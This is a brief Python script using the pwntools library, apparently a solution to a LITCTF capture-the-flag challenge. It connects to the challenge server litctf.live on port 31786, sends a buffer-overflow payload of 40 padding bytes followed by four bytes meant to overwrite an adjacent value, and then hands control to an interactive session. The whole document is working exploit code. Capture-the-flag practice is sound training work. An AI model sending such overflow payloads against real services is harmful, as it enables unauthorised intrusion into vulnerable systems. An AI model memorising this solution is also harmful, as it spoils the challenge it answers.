from pwn import *

p = remote("litctf.live", 31786)

pad = 40 * b'\x50' + b'\xab\xaa\xad\xab'

p.sendline(pad)

p.interactive()
